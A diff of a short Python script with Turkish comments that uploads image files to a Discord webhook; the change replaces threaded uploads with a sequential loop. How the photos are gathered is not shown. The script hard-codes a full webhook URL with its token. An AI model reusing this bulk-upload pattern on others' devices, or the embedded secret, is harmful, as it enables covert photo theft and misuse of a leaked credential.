@@ -1,9 +1,8 @@
 import os
 import requests
-from concurrent.futures import ThreadPoolExecutor
 from tqdm import tqdm
 
-WEBHOOK_URL = "https://discord.com/api/webhooks/1414709102415708260/fchkKmLpaYQDW09genXyEsvB3V6eerwvAuVxBPeQlve6h8sD31aowoM2pLbTefuWe0pl"  # Buraya kendi webhook adresini yaz
+WEBHOOK_URL = "https://discord.com/api/webhooks/1414709102415708260/fchkKmLpaYQDW09genXyEsvB3V6eerwvAuVxBPeQlve6h8sD31aowoM2pLbTefuWe0pl"  # Kendi Discord webhook adresin
 
 def send_to_discord(image_path):
     try:
@@ -23,9 +22,9 @@ def main():
 
     print(f"Toplam {len(image_files)} fotoğraf bulundu. Gönderiliyor...")
 
-    # Aynı anda 10 fotoğraf gönder (çok fazla arttırırsan Discord rate limit hatası verebilir)
-    with ThreadPoolExecutor(max_workers=10) as executor:
-        list(tqdm(executor.map(send_to_discord, image_files), total=len(image_files), desc="YÜKLENİYOR", unit="foto"))
+    # Fotoğrafları sırayla gönder (tek iş parçacığı)
+    for image_path in tqdm(image_files, desc="YÜKLENİYOR", unit="foto"):
+        send_to_discord(image_path)
 
 if __name__ == "__main__":
     main()
